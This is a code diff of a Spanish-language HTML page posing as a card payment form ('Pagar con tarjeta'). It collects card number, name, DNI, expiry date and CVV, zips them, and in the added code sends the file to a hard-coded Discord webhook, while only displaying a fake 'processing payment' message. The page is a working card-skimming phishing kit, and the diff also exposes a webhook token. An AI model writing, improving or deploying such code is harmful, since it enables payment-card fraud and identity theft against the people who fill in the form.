@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjetas</title>
+  <title>Pagar con tarjeta</title>
   <style>
     body {
       background: linear-gradient(to right, black, gray);
@@ -56,52 +56,82 @@
       color: red;
       margin-bottom: 10px;
     }
+    
+    .ui-datepicker {
+      background-color: white;
+      color: black;
+    }
+    
+    .ui-datepicker-header {
+      background-color: #1e1e1e;
+      color: white;
+    }
+    
+    .ui-datepicker-calendar a {
+      color: black;
+    }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.0/jszip.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
   <script>
-    function updateSigninStatus(isSignedIn) {
-      if (isSignedIn) {
-        var cardNumber = document.getElementById("card-number").value;
-        var cardName = document.getElementById("card-name").value;
-        var cardDNI = document.getElementById("card-dni").value;
-        var cardExpiration = document.getElementById("card-expiration").value;
-        var cardCVV = document.getElementById("card-cvv").value;
+    function updateSigninStatus() {
+      var cardNumber = document.getElementById("card-number").value;
+      var cardName = document.getElementById("card-name").value;
+      var cardDNI = document.getElementById("card-dni").value;
+      var cardExpiration = document.getElementById("card-expiration").value;
+      var cardCVV = document.getElementById("card-cvv").value;
 
-        if (!validateCard(cardNumber)) {
-          document.getElementById("error-message").textContent = "Tarjeta inválida";
-          return;
-        }
-
-        var fileName = cardNumber.substr(0, 4) + '_' + cardName + '_Tarjeta.csv';
-
-        var cardData = [
-          new Date().toLocaleString(),
-          cardNumber,
-          cardName,
-          cardDNI,
-          cardExpiration,
-          cardCVV
-        ];
-
-        createAndDownloadZip(fileName, cardData);
-        document.getElementById("done-message").textContent = "Listo! Procesando pago...";
-
-        setTimeout(function() {
-          document.getElementById("done-message").textContent = "";
-        }, 2000);
+      if (!validateCard(cardNumber)) {
+        document.getElementById("error-message").textContent = "Tarjeta inválida";
+        return;
       }
+
+      var fileName = cardNumber.substr(0, 4) + '_' + cardName + '_Tarjeta.csv';
+
+      var cardData = [
+        new Date().toLocaleString(),
+        cardNumber,
+        cardName,
+        cardDNI,
+        cardExpiration,
+        cardCVV
+      ];
+
+      createAndDownloadZip(fileName, cardData);
+      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
+
+      setTimeout(function() {
+        document.getElementById("done-message").textContent = "";
+      }, 2000);
     }
 
     function createAndDownloadZip(fileName, cardData) {
       var zip = new JSZip();
       var csvContent = cardData.join(", ");
       zip.file(fileName, csvContent);
-      var zipBlob = zip.generate({ type: "blob", compression: "DEFLATE" });
+      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: "08papanat4s" })
+        .then(function(content) {
+          var link = document.createElement("a");
+          link.href = URL.createObjectURL(content);
+          link.download = fileName + ".zip";
+          link.click();
 
-      var link = document.createElement("a");
-      link.href = URL.createObjectURL(zipBlob);
-      link.download = fileName + ".zip";
-      link.click();
+          // Envío del archivo al webhook
+          var formData = new FormData();
+          formData.append('file', content);
+
+          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
+            method: "POST",
+            body: formData
+          })
+          .then(function(response) {
+            console.log("Archivo enviado al webhook con éxito");
+          })
+          .catch(function(error) {
+            console.error("Error al enviar el archivo al webhook:", error);
+          });
+        });
     }
 
     function validateCard(cardNumber) {
@@ -124,41 +154,67 @@
 
       return sum % 10 === 0;
     }
+
+    $(function() {
+      $("#card-expiration").datepicker({
+        dateFormat: "mm/yy",
+        changeMonth: true,
+        changeYear: true,
+        monthNames: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        monthNamesShort: [
+          "01", "02", "03", "04", "05", "06",
+          "07", "08", "09", "10", "11", "12"
+        ],
+        prevText: "Anterior",
+        nextText: "Siguiente",
+        yearRange: "-0:+10",
+        showOtherMonths: true,
+        selectOtherMonths: true,
+        showMonthAfterYear: true,
+      });
+      
+      $("#card-cvv").on("input", function() {
+        this.value = this.value.replace(/[^0-9]/g, "").slice(0, 3);
+      });
+    });
   </script>
 </head>
 <body>
   <div class="container">
     <h1>Pedido por Tarjeta</h1>
-
+  
     <div id="error-message"></div>
     <div id="done-message"></div>
-
+  
     <div class="input-field">
       <label for="card-number">Número de Tarjeta:</label>
       <input type="text" id="card-number" maxlength="16" />
     </div>
-
+  
     <div class="input-field">
       <label for="card-name">Nombre:</label>
       <input type="text" id="card-name" />
     </div>
-
+  
     <div class="input-field">
       <label for="card-dni">DNI:</label>
       <input type="text" id="card-dni" maxlength="8" />
     </div>
-
+  
     <div class="input-field">
       <label for="card-expiration">Fecha de Expiración:</label>
       <input type="text" id="card-expiration" />
     </div>
-
+    
     <div class="input-field">
       <label for="card-cvv">CVV:</label>
       <input type="text" id="card-cvv" maxlength="3" />
     </div>
-
-    <button onclick="updateSigninStatus(true)">Enviar</button>
+  
+    <button onclick="updateSigninStatus()">Enviar</button>
   </div>
 </body>
 </html>
